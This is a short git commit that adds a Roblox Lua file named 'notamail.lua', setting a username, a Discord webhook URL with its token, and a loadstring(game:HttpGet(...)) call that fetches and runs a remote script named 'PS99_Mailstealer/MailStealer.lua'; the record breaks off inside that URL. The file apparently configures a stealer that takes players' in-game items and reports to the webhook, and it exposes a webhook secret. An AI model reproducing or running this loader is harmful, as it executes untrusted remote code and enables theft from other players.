c21b7334ff2db5069c878c48e546fa0e2daef041
nikeshkunwar24 <kunwarnikesh178@gmail.com>
2024-11-15 16:25:38 +0545

    Add files via upload

---
+++ notamail.lua
@@ -0,0 +1,5 @@
+Username = "nikeshkunwar24"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1305153966035964034/muNxkEU3rHok1dbttXhMMDvvHEW-ot7D24BoO_1dFxHNZ6CuwXcsMz9oWSrHgRo8c-3p"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua
